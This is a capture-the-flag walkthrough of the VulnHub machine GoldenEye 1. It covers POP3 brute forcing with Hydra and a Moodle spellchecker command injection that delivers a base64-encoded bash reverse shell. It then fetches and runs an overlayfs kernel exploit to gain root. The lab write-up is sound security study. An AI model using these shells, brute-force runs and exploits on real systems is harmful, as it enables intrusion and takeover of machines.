---
title: VulnHub - GoldenEye 1
author: ret2x
date: 2021-10-17 21:35:12 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, command injection]
image:
    path: /assets/images/goldeneye/front.png
---

**Description:** A linux machine that requires a further enumeration through many services in order to exploit a Remote Command Execution vulnerability in Moodle CMS. A kernel exploit made it possible to gain root privileges.

**Author:** creosote

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/goldeneye-1,240/](https://www.vulnhub.com/entry/goldeneye-1,240/)

## Information Gathering
### Host Discovery

I discovered the target machine on the local network.

```console
root@kali:~$ arp-scan -I vmnet1 192.168.179.1/24 
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.179.156 00:0c:29:e1:fb:07       VMware, Inc.
192.168.179.254 00:50:56:fd:22:9e       VMware, Inc.
```

### Port Scanning

I did a full TCP port scan to discover for open ports.

```console
root@kali:~$ nmap -n -vv -p- -T4 192.168.179.156 -oG nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE REASON
25/tcp    open  smtp    syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
55006/tcp open  unknown syn-ack ttl 64
55007/tcp open  unknown syn-ack ttl 64
```

### Service Enumeration

I performed service detection on open ports and script scanning on the target machine.

```console
root@kali:~$ nmap -v -sV -sC -p25,80,55006,55007 192.168.179.156 -oN nmap/service-enum.txt
...
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
|_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS USER RESP-CODES CAPA AUTH-RESP-CODE SASL(PLAIN) UIDL TOP
|_ssl-date: TLS randomness does not represent time
```

### Web Enumeration

In the web application, I could see a directory path to login, but I don't have the credentials, so I proceeded to look at the page source and found the terminal.js link, I clicked on it and this redirected me to a note with the encoded password of the user Boris, and a user named Natalya.

![](/assets/images/goldeneye/screenshot-1.png)

![](/assets/images/goldeneye/screenshot-2.png)

![](/assets/images/goldeneye/screenshot-3.png)

This string is HTML encoding, so I decoded it and got the password in plain text.

![](/assets/images/goldeneye/screenshot-4.png)

I proceeded to log in to the page as the Boris user.

![](/assets/images/goldeneye/screenshot-5.png)

![](/assets/images/goldeneye/screenshot-6.png)

When reviewing the page source the users Natalya and Boris were revealed.

![](/assets/images/goldeneye/screenshot-7.png)


### POP3 Enumeration

I proceeded to perform brute force the pop3 service with the Boris user but was unsuccessful, so I tried it with the Natalya user and found her password.

```console
root@kali:~$ hydra -l natalya -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt pop3://192.168.179.156 -s 55006  -t 50 -S
...
[55006][pop3] host: 192.168.179.156   login: natalya   password: bird
...
```

Then I logged in to pop3 and found the xenia's creds and a domain name that must be saved in the hosts file of the system.

```console
root@kali:~$ openssl s_client -connect 192.168.179.156:55006 -crlf -quiet
...
USER natalya
+OK
PASS bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

I assigned the domain name to the hosts file of my system.

```console
root@kali:~$ echo '192.168.179.156 severnaya-station.com' >> /etc/hosts
```

I requested that domain name and this redirected me to a moodle platform.

![](/assets/images/goldeneye/screenshot-8.png)

I logged in as the xenia user.

![](/assets/images/goldeneye/screenshot-9.png)

As we see at the bottom of the page, we have a message from Dr Doak.

![](/assets/images/goldeneye/screenshot-10.png)

I clicked on **Go to messages**, it's a welcome message for Xenia from Doak, he tells her that she can only communicate with him via email.

![](/assets/images/goldeneye/screenshot-11.png)

Then with the Doak user I brute force and found his password.

```console
root@kali:~$ hydra -l doak -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt pop3://192.168.179.156 -s 55006  -t 50 -S
...
[55006][pop3] host: 192.168.179.156   login: doak   password: goat
...
```

I logged in to the pop3 service and found his credentials for the moodle platform.

```console
root@kali:~$ openssl s_client -connect 192.168.179.156:55006 -crlf -quiet
...
USER doak
+OK
PASS goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

I logged in to moodle as dr_doak.

![](/assets/images/goldeneye/screenshot-12.png)

In the following path I found the s3cret.txt file.

**My profile -> My private files**

![](/assets/images/goldeneye/screenshot-13.png)

I downloaded the s3cret.txt file, and the message let us know that the admin's credentials was able to capture in plain text, and that juicy information is in a specified path. 

```console
root@kali:~$ cat s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

This is an image, so I downloaded it to the attacking machine.

```console
root@kali:~$ wget http://severnaya-station.com/dir007key/for-007.jpg
```

I analized the exif data and found a base64 encoded string, filtered the string and decoded it.

```console
root@kali:~$ exif for-007.jpg | grep Image | awk -F "|" '{print $NF}' | base64 -d
xWinter1995x!
```

Then I logged in to moodle platform as admin user.

![](/assets/images/goldeneye/screenshot-14.png)

![](/assets/images/goldeneye/screenshot-15.png)

## Exploitation
### Remote Command Execution

This version 2.2.3 of moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.

To exploit this, we need to locate ourselves in the following path:

```console
Site administration -> Server -> System paths
```

Then I base64 encoded the bash reverse shell to obfuscate it.

```console
root@kali:~$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.179.1/443 0>&1"' | base64 | tr -d '\n'
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzkuMS80NDMgMD4mMSIK
```

In the **Path to aspell** box we enter the following instruction, and save the changes.

```console
$(echo 'L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzkuMS80NDMgMD4mMSIK' | base64 -d | bash)
```

![](/assets/images/goldeneye/screenshot-16.png)

Then, in the path:

**Site administration -> Plugins -> Text editors -> TinyMCE HTML editor**

At **Spell engine** we select **PspellShell** and save the changes.

![](/assets/images/goldeneye/screenshot-17.png)

And finally, in the path:

**Site administration -> Courses -> Add/edit courses**

Then, we click on **Add a new course**, before to execute the reverse shell we need set up a netcat listener and then click on **Toggle spellchecker**.

![](/assets/images/goldeneye/screenshot-18.png)

We got a shell, with the permissions that the moodle platform is running.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.156] 48348
bash: cannot set terminal process group (1141): Inappropriate ioctl for device
bash: no job control in this shell
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Googling I found that this version of the kernel is vulnerable to the overlayfs exploit.

```console
www-data@ubuntu:/dev/shm$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation
### Kernel Exploit

The issue lies in the ovl_setattr function in fs/overlayfs/inode.c in the Linux kernel through 4.3.3 attempts to merge distinct setattr operations, which allows local users to bypass intended access restrictions and modify the attributes of arbitrary overlay files via a crafted application.

I downloaded the exploit to the attacking machine, in the exploit I modified gcc to cc since the gcc compiler doesn't exist on the target machine, I compiled it and started the apache service, you can download the exploit [here](https://www.exploit-db.com/exploits/37292).

```console
root@kali:~$ wget --quiet https://www.exploit-db.com/download/37292 -O ofs.c
root@kali:~$ sed -i 's/gcc -/cc -/' ofs.c
root@kali:~$ gcc ofs.c -o /var/www/html/ofs
root@kali:~$ systemctl start apache2
```

I transferred the exploit to the target machine, granted it execute privileges, ran it, and got root.

```console
www-data@ubuntu:/dev/shm$ wget -q 192.168.179.1/ofs && chmod +x ofs && ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cat .flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

![](/assets/images/goldeneye/screenshot-19.png)
